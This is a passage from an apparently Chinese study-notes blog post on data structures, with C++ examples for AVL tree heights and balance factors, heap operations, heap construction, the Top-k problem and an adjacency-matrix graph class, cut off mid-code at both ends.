节点值</span><br>    <span class="hljs-type">int</span> height = <span class="hljs-number">0</span>;     <span class="hljs-comment">// 节点高度</span><br>    TreeNode *left&#123;&#125;;   <span class="hljs-comment">// 左子节点</span><br>    TreeNode *right&#123;&#125;;  <span class="hljs-comment">// 右子节点</span><br>    <span class="hljs-built_in">TreeNode</span>() = <span class="hljs-keyword">default</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">TreeNode</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> : val(x)&#123;</span>&#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>“节点高度”是指从该节点到它的最远叶节点的距离，即所经过的“边”的数量。需要特别注意的是，叶节点的高度为$0$，而空节点的高度为$-1$。我们将创建两个工具函数，分别用于获取和更新节点的高度：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 获取节点高度 */</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">height</span><span class="hljs-params">(TreeNode *node)</span> </span>&#123;<br>    <span class="hljs-comment">// 空节点高度为 -1 ，叶节点高度为 0</span><br>    <span class="hljs-keyword">return</span> node == <span class="hljs-literal">nullptr</span> ? <span class="hljs-number">-1</span> : node-&gt;height;<br>&#125;<br><br><span class="hljs-comment">/* 更新节点高度 */</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">updateHeight</span><span class="hljs-params">(TreeNode *node)</span> </span>&#123;<br>    <span class="hljs-comment">// 节点高度等于最高子树高度 + 1</span><br>    node-&gt;height = <span class="hljs-built_in">max</span>(<span class="hljs-built_in">height</span>(node-&gt;left), <span class="hljs-built_in">height</span>(node-&gt;right)) + <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>节点平衡因子</li></ol><p>节点的平衡因子（balance factor）定义为节点左子树的高度减去右子树的高度，同时规定空节点的平衡因子为$0$。我们同样将获取节点平衡因子的功能封装成函数，方便后续使用：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 获取平衡因子 */</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">balanceFactor</span><span class="hljs-params">(TreeNode *node)</span> </span>&#123;<br>    <span class="hljs-comment">// 空节点平衡因子为 0</span><br>    <span class="hljs-keyword">if</span> (node == <span class="hljs-literal">nullptr</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 节点平衡因子 = 左子树高度 - 右子树高度</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">height</span>(node-&gt;left) - <span class="hljs-built_in">height</span>(node-&gt;right);<br>&#125;<br></code></pre></td></tr></table></figure><p>设平衡因子为$f$，则一棵 AVL 树的任意节点的平衡因子皆满足$-1 \leq f \leq 1$  。</p><h5 id="AVL树旋转"><a href="#AVL树旋转" class="headerlink" title="AVL树旋转"></a>AVL树旋转</h5><p>具体步骤参考：<a href="https://www.hello-algo.com/chapter_tree/avl_tree/#752-avl">https://www.hello-algo.com/chapter_tree/avl_tree/#752-avl</a></p><h3 id="第8章-堆"><a href="#第8章-堆" class="headerlink" title="第8章 堆"></a>第8章 堆</h3><h4 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h4><p>堆（heap）是一种满足特定条件的完全二叉树，主要可分为两种类型，如图所示。</p><ul><li>小顶堆（min heap）：任意节点的值 $\leq$ 其子节点的值。</li><li>大顶堆（max heap）：任意节点的值 $\geq$ 其子节点的值。</li></ul><p><img src="https://www.hello-algo.com/chapter_heap/heap.assets/min_heap_and_max_heap.png" srcset="/img/loading.gif" lazyload></p><p>堆作为完全二叉树的一个特例，具有以下特性。</p><ul><li>最底层节点靠左填充，其他层的节点都被填满。</li><li>我们将二叉树的根节点称为“堆顶”，将底层最靠右的节点称为“堆底”。</li><li>对于大顶堆（小顶堆），堆顶元素（根节点）的值是最大（最小）的。</li></ul><h5 id="堆的常用操作"><a href="#堆的常用操作" class="headerlink" title="堆的常用操作"></a>堆的常用操作</h5><p>需要指出的是，许多编程语言提供的是优先队列（priority queue），这是一种抽象的数据结构，定义为具有优先级排序的队列。</p><p>实际上，<strong>堆通常用于实现优先队列，大顶堆相当于元素按从大到小的顺序出队的优先队列</strong>。从使用角度来看，我们可以将“优先队列”和“堆”看作等价的数据结构。因此，本书对两者不做特别区分，统一称作“堆”。</p><p>堆的常用操作见下表 ，方法名需要根据编程语言来确定。</p><table><thead><tr><th align="center">方法名</th><th align="center">描述</th><th align="center">时间复杂度</th></tr></thead><tbody><tr><td align="center"><code>push()</code></td><td align="center">元素入堆</td><td align="center">$O(logn)$</td></tr><tr><td align="center"><code>pop()</code></td><td align="center">堆顶元素出堆</td><td align="center">$O(logn)$</td></tr><tr><td align="center"><code>peek()</code></td><td align="center">访问堆顶元素（对于大 &#x2F; 小顶堆分别为最大 &#x2F; 小值）</td><td align="center">$O(1)$</td></tr><tr><td align="center"><code>size()</code></td><td align="center">获取堆的元素数量</td><td align="center">$O(1)$</td></tr><tr><td align="center"><code>isEmpty()</code></td><td align="center">判断堆是否为空</td><td align="center">$O(1)$</td></tr></tbody></table><p>在实际应用中，我们可以直接使用编程语言提供的堆类（或优先队列类）。</p><p>类似于排序算法中的“从小到大排列”和“从大到小排列”，我们可以通过设置一个 <code>flag</code> 或修改 <code>Comparator</code> 实现“小顶堆”与“大顶堆”之间的转换。代码如下所示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 初始化堆 */</span><br><span class="hljs-comment">// 初始化小顶堆</span><br>priority_queue&lt;<span class="hljs-type">int</span>, vector&lt;<span class="hljs-type">int</span>&gt;, greater&lt;<span class="hljs-type">int</span>&gt;&gt; minHeap;<br><span class="hljs-comment">// 初始化大顶堆</span><br>priority_queue&lt;<span class="hljs-type">int</span>, vector&lt;<span class="hljs-type">int</span>&gt;, less&lt;<span class="hljs-type">int</span>&gt;&gt; maxHeap;<br><br><span class="hljs-comment">/* 元素入堆 */</span><br>maxHeap.<span class="hljs-built_in">push</span>(<span class="hljs-number">1</span>);<br>maxHeap.<span class="hljs-built_in">push</span>(<span class="hljs-number">3</span>);<br>maxHeap.<span class="hljs-built_in">push</span>(<span class="hljs-number">2</span>);<br>maxHeap.<span class="hljs-built_in">push</span>(<span class="hljs-number">5</span>);<br>maxHeap.<span class="hljs-built_in">push</span>(<span class="hljs-number">4</span>);<br><br><span class="hljs-comment">/* 获取堆顶元素 */</span><br><span class="hljs-type">int</span> peek = maxHeap.<span class="hljs-built_in">top</span>(); <span class="hljs-comment">// 5</span><br><br><span class="hljs-comment">/* 堆顶元素出堆 */</span><br><span class="hljs-comment">// 出堆元素会形成一个从大到小的序列</span><br>maxHeap.<span class="hljs-built_in">pop</span>(); <span class="hljs-comment">// 5</span><br>maxHeap.<span class="hljs-built_in">pop</span>(); <span class="hljs-comment">// 4</span><br>maxHeap.<span class="hljs-built_in">pop</span>(); <span class="hljs-comment">// 3</span><br>maxHeap.<span class="hljs-built_in">pop</span>(); <span class="hljs-comment">// 2</span><br>maxHeap.<span class="hljs-built_in">pop</span>(); <span class="hljs-comment">// 1</span><br><br><span class="hljs-comment">/* 获取堆大小 */</span><br><span class="hljs-type">int</span> size = maxHeap.<span class="hljs-built_in">size</span>();<br><br><span class="hljs-comment">/* 判断堆是否为空 */</span><br><span class="hljs-type">bool</span> isEmpty = maxHeap.<span class="hljs-built_in">empty</span>();<br><br><span class="hljs-comment">/* 输入列表并建堆 */</span><br>vector&lt;<span class="hljs-type">int</span>&gt; input&#123;<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>&#125;;<br>priority_queue&lt;<span class="hljs-type">int</span>, vector&lt;<span class="hljs-type">int</span>&gt;, greater&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">minHeap</span>(input.<span class="hljs-built_in">begin</span>(), input.<span class="hljs-built_in">end</span>());<br></code></pre></td></tr></table></figure><h5 id="堆的实现"><a href="#堆的实现" class="headerlink" title="堆的实现"></a>堆的实现</h5><p>“二叉树”章节讲过，完全二叉树非常适合用数组来表示。由于堆正是一种完全二叉树，<strong>因此我们将采用数组来存储堆</strong>。</p><p>当使用数组表示二叉树时，元素代表节点值，索引代表节点在二叉树中的位置。<strong>节点指针通过索引映射公式来实现</strong>。</p><p>如图所示，给定索引 $i$，其左子节点的索引为 $2i+1$，右子节点的索引为 $2i+2$，父节点的索引为 $(i-1)&#x2F;2$（向下整除）。当索引越界时，表示空节点或节点不存在。</p><p><img src="https://www.hello-algo.com/chapter_heap/heap.assets/representation_of_heap.png" srcset="/img/loading.gif" lazyload></p><p>给定元素 <code>val</code> ，我们首先将其添加到堆底。添加之后，由于 <code>val</code> 可能大于堆中其他元素，堆的成立条件可能已被破坏，<strong>因此需要修复从插入节点到根节点的路径上的各个节点</strong>，这个操作被称为堆化（heapify）。</p><p>考虑从入堆节点开始，<strong>从底至顶执行堆化</strong>。我们比较插入节点与其父节点的值，如果插入节点更大，则将它们交换。然后继续执行此操作，从底至顶修复堆中的各个节点，直至越过根节点或遇到无须交换的节点时结束。</p><p>设节点总数为 $n$，则树的高度为 $O(logn)$。由此可知，堆化操作的循环轮数最多为 $O(logn)$，<strong>元素入堆操作的时间复杂度为</strong> $O(logn)$。代码如下所示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 元素入堆 */</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">int</span> val)</span> </span>&#123;<br>    <span class="hljs-comment">// 添加节点</span><br>    maxHeap.<span class="hljs-built_in">push_back</span>(val);<br>    <span class="hljs-comment">// 从底至顶堆化</span><br>    <span class="hljs-built_in">siftUp</span>(<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">/* 从节点 i 开始，从底至顶堆化 */</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">siftUp</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> </span>&#123;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-comment">// 获取节点 i 的父节点</span><br>        <span class="hljs-type">int</span> p = <span class="hljs-built_in">parent</span>(i);<br>        <span class="hljs-comment">// 当“越过根节点”或“节点无须修复”时，结束堆化</span><br>        <span class="hljs-keyword">if</span> (p &lt; <span class="hljs-number">0</span> || maxHeap[i] &lt;= maxHeap[p])<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">// 交换两节点</span><br>        <span class="hljs-built_in">swap</span>(maxHeap[i], maxHeap[p]);<br>        <span class="hljs-comment">// 循环向上堆化</span><br>        i = p;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>堆顶元素是二叉树的根节点，即列表首元素。如果我们直接从列表中删除首元素，那么二叉树中所有节点的索引都会发生变化，这将使得后续使用堆化进行修复变得困难。为了尽量减少元素索引的变动，我们采用以下操作步骤。</p><ol><li>交换堆顶元素与堆底元素（交换根节点与最右叶节点）。</li><li>交换完成后，将堆底从列表中删除（注意，由于已经交换，因此实际上删除的是原来的堆顶元素）。</li><li>从根节点开始，<strong>从顶至底执行堆化</strong>。</li></ol><p>与元素入堆操作相似，堆顶元素出堆操作的时间复杂度也为 $O(logn)$。代码如下所示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 元素出堆 */</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 判空处理</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isEmpty</span>()) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-built_in">out_of_range</span>(<span class="hljs-string">&quot;堆为空&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 交换根节点与最右叶节点（交换首元素与尾元素）</span><br>    <span class="hljs-built_in">swap</span>(maxHeap[<span class="hljs-number">0</span>], maxHeap[<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>]);<br>    <span class="hljs-comment">// 删除节点</span><br>    maxHeap.<span class="hljs-built_in">pop_back</span>();<br>    <span class="hljs-comment">// 从顶至底堆化</span><br>    <span class="hljs-built_in">siftDown</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">/* 从节点 i 开始，从顶至底堆化 */</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">siftDown</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> </span>&#123;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-comment">// 判断节点 i, l, r 中值最大的节点，记为 ma</span><br>        <span class="hljs-type">int</span> l = <span class="hljs-built_in">left</span>(i), r = <span class="hljs-built_in">right</span>(i), ma = i;<br>        <span class="hljs-keyword">if</span> (l &lt; <span class="hljs-built_in">size</span>() &amp;&amp; maxHeap[l] &gt; maxHeap[ma])<br>            ma = l;<br>        <span class="hljs-keyword">if</span> (r &lt; <span class="hljs-built_in">size</span>() &amp;&amp; maxHeap[r] &gt; maxHeap[ma])<br>            ma = r;<br>        <span class="hljs-comment">// 若节点 i 最大或索引 l, r 越界，则无须继续堆化，跳出</span><br>        <span class="hljs-keyword">if</span> (ma == i)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-built_in">swap</span>(maxHeap[i], maxHeap[ma]);<br>        <span class="hljs-comment">// 循环向下堆化</span><br>        i = ma;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="建堆操作"><a href="#建堆操作" class="headerlink" title="建堆操作"></a>建堆操作</h4><h5 id="借助入堆操作实现"><a href="#借助入堆操作实现" class="headerlink" title="借助入堆操作实现"></a>借助入堆操作实现</h5><p>我们首先创建一个空堆，然后遍历列表，依次对每个元素执行“入堆操作”，即先将元素添加至堆的尾部，再对该元素执行“从底至顶”堆化。</p><p>每当一个元素入堆，堆的长度就加一。由于节点是从顶到底依次被添加进二叉树的，因此堆是“自上而下”构建的。</p><p>设元素数量为 $n$，每个元素的入堆操作使用 $O(logn)$时间，因此该建堆方法的时间复杂度为 $O(nlogn)$。</p><h5 id="通过遍历堆化实现"><a href="#通过遍历堆化实现" class="headerlink" title="通过遍历堆化实现"></a>通过遍历堆化实现</h5><p>实际上，我们可以实现一种更为高效的建堆方法，共分为两步。</p><ol><li>将列表所有元素原封不动地添加到堆中，此时堆的性质尚未得到满足。</li><li>倒序遍历堆（层序遍历的倒序），依次对每个非叶节点执行“从顶至底堆化”。</li></ol><p><strong>每当堆化一个节点后，以该节点为根节点的子树就形成一个合法的子堆</strong>。而由于是倒序遍历，因此堆是“自下而上”构建的。</p><p>之所以选择倒序遍历，是因为这样能够保证当前节点之下的子树已经是合法的子堆，这样堆化当前节点才是有效的。</p><p>值得说明的是，<strong>由于叶节点没有子节点，因此它们天然就是合法的子堆，无须堆化</strong>。如以下代码所示，最后一个非叶节点是最后一个节点的父节点，我们从它开始倒序遍历并执行堆化：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 构造方法，根据输入列表建堆 */</span><br><span class="hljs-built_in">MaxHeap</span>(vector&lt;<span class="hljs-type">int</span>&gt; nums) &#123;<br>    <span class="hljs-comment">// 将列表元素原封不动添加进堆</span><br>    maxHeap = nums;<br>    <span class="hljs-comment">// 堆化除叶节点以外的其他所有节点</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-built_in">parent</span>(<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>); i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-built_in">siftDown</span>(i);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>参考：<a href="https://www.hello-algo.com/chapter_heap/build_heap">https://www.hello-algo.com/chapter_heap/build_heap</a></p><p><strong>输入列表并建堆的时间复杂度为 $O(n)$，非常高效</strong>。</p><h4 id="用堆解决Top-k问题"><a href="#用堆解决Top-k问题" class="headerlink" title="用堆解决Top-k问题"></a>用堆解决Top-k问题</h4><p>给定一个长度为 的无序数组 <code>nums</code> ，请返回数组中最大的 $k$ 个元素。</p><p>我们可以基于堆更加高效地解决 Top-k 问题，流程下所示。</p><ol><li>初始化一个小顶堆，其堆顶元素最小。</li><li>先将数组的前 $k$ 个元素依次入堆。</li><li>从第 $k+1$ 个元素开始，若当前元素大于堆顶元素，则将堆顶元素出堆，并将当前元素入堆。</li><li>遍历完成后，堆中保存的就是最大的 $k$ 个元素。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 基于堆查找数组中最大的 k 个元素 */</span><br>priority_queue&lt;<span class="hljs-type">int</span>, vector&lt;<span class="hljs-type">int</span>&gt;, greater&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">topKHeap</span>(vector&lt;<span class="hljs-type">int</span>&gt; &amp;nums, <span class="hljs-type">int</span> k) &#123;<br>    <span class="hljs-comment">// 初始化小顶堆</span><br>    priority_queue&lt;<span class="hljs-type">int</span>, vector&lt;<span class="hljs-type">int</span>&gt;, greater&lt;<span class="hljs-type">int</span>&gt;&gt; heap;<br>    <span class="hljs-comment">// 将数组的前 k 个元素入堆</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; k; i++) &#123;<br>        heap.<span class="hljs-built_in">push</span>(nums[i]);<br>    &#125;<br>    <span class="hljs-comment">// 从第 k+1 个元素开始，保持堆的长度为 k</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = k; i &lt; nums.<span class="hljs-built_in">size</span>(); i++) &#123;<br>        <span class="hljs-comment">// 若当前元素大于堆顶元素，则将堆顶元素出堆、当前元素入堆</span><br>        <span class="hljs-keyword">if</span> (nums[i] &gt; heap.<span class="hljs-built_in">top</span>()) &#123;<br>            heap.<span class="hljs-built_in">pop</span>();<br>            heap.<span class="hljs-built_in">push</span>(nums[i]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> heap;<br>&#125;<br></code></pre></td></tr></table></figure><p>总共执行了 $n$ 轮入堆和出堆，堆的最大长度为 $k$，因此时间复杂度为 $O(nlogk)$。该方法的效率很高，当 $k$ 较小时，时间复杂度趋向 $O(n)$；当 $k$ 较大时，时间复杂度不会超过 $O(nlogn)$。</p><p>另外，该方法适用于动态数据流的使用场景。在不断加入数据时，我们可以持续维护堆内的元素，从而实现最大的 $k$ 个元素的动态更新。</p><h5 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h5><p><strong>Q</strong>：数据结构的“堆”与内存管理的“堆”是同一个概念吗？</p><p>两者不是同一个概念，只是碰巧都叫“堆”。计算机系统内存中的堆是动态内存分配的一部分，程序在运行时可以使用它来存储数据。程序可以请求一定量的堆内存，用于存储如对象和数组等复杂结构。当这些数据不再需要时，程序需要释放这些内存，以防止内存泄漏。相较于栈内存，堆内存的管理和使用需要更谨慎，使用不当可能会导致内存泄漏和野指针等问题。</p><h3 id="第9章-图"><a href="#第9章-图" class="headerlink" title="第9章 图"></a>第9章 图</h3><h4 id="图的表示"><a href="#图的表示" class="headerlink" title="图的表示"></a>图的表示</h4><p><strong>邻接表结构与哈希表中的“链式地址”非常相似，因此我们也可以采用类似的方法来优化效率</strong>。比如当链表较长时，可以将链表转化为 AVL 树或红黑树，从而将时间效率从$O(n)$优化至$O(logn)$；还可以把链表转换为哈希表，从而将时间复杂度降至$O(1)$。</p><h4 id="图的基本操作实现"><a href="#图的基本操作实现" class="headerlink" title="图的基本操作实现"></a>图的基本操作实现</h4><h5 id="邻接矩阵实现"><a href="#邻接矩阵实现" class="headerlink" title="邻接矩阵实现"></a>邻接矩阵实现</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 基于邻接矩阵实现的无向图类 */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GraphAdjMat</span> &#123;<br>    vector&lt;<span class="hljs-type">int</span>&gt; vertices;       <span class="hljs-comment">// 顶点列表，元素代表“顶点值”，索引代表“顶点索引”</span><br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; adjMat; <span class="hljs-comment">// 邻接矩阵，行列索引对应“顶点索引”</span><br><br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">/* 构造方法 */</span><br>    <span class="hljs-built_in">GraphAdjMat</span>(<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt; &amp;vertices, <span class="hljs-type">const</span> vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; &amp;edges) &#123;<br>        <span class="hljs-comment">// 添加顶点</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> val : vertices) &#123;<br>            <span class="hljs-built_in">addVertex</span>(val);<br>        &#125;<br>        <span class="hljs-comment">// 添加边</span><br>        <span class="hljs-comment">// 请注意，edges 元素代表顶点索引，即对应 vertices 元素索引</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt; &amp;edge : edges) &#123;<br>            <span class="hljs-built_in">addEdge</span>(edge[<span class="hljs-number">0</span>], edge[<span class="hljs-number">1</span>]);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* 获取顶点数量 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> vertices.<span class="hljs-built_in">size</span>();<br>    &#125;<br><br>    <span class="hljs-comment">/* 添加顶点 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">addVertex</span><span class="hljs-params">(<span class="hljs-type">int</span> val)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = <span class="hljs-built_in">size</span>();<br>        <span class="hljs-comment">// 向顶点列表中添加新顶点的值</span><br>        vertices.<span class="hljs-built_in">push_back</span>(val);<br>        <span class="hljs-comment">// 在邻接矩阵中添加一行</span><br>        adjMat.<span class="hljs-built_in">emplace_back</span>(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(n, <span class="hljs-number">0</span>));<br>        <span class="hljs-comment">// 在邻接矩阵中添加一列</span><br>        <span class="hljs-keyword">for</span> (vector&lt;<span class="hljs-type">int</span>&gt; &amp;row : adjMat) &#123;<br>            row.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* 删除顶点 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">removeVertex</span><span class="hljs-params">(<span class="hljs-type">int</span> index)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (index &gt;= <span class="hljs-built_in">size</span>()) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-built_in">out_of_range</span>(<span class="hljs-string">&quot;顶点不存在&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">// 在顶点列表中移除索引 index 的顶点</span><br>        vertices.<span class="hljs-built_in">erase</span>(vertices.<span class="hljs-built_in">begin</span>() + index);<br>        <span class="hljs-comment">// 在邻接矩阵中删除索引 index 的行</span><br>        adjMat.<span class="hljs-built_in">erase</span>(adjMat.<span class="hljs-built_in">begin</span>() + index);<br>        <span class="hljs-comment">// 在邻接矩阵中删除索引 index 的列</span><br>        <span class="hljs-keyword">for</span> (vector&lt;<span class="hljs-type">int</span>&gt; &amp;row : adjMat) &#123;<br>            row.<span class="hljs-built_in">erase</span>(row.<span class="hljs-built_in">begin</span>() + index);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* 添加边 */</span><br>    <span class="hljs-comment">// 参数 i, j 对应 vertices 元素索引</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">addEdge</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j)</span> </span>&#123;<br>        <span class="hljs-comment">// 索引越界与相等处理</span><br>        <span class="hljs-keyword">if</span> (i &lt; <span class="hljs-number">0</span> || j &lt; <span class="hljs-number">0</span> || i &gt;= <span class="hljs-built_in">size</span>() || j &gt;= <span class="hljs-built_in">size</span>() || i == j) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-built_in">out_of_range</span>(<span class="hljs-string">&quot;顶点不存在&quot;</span>);<br>        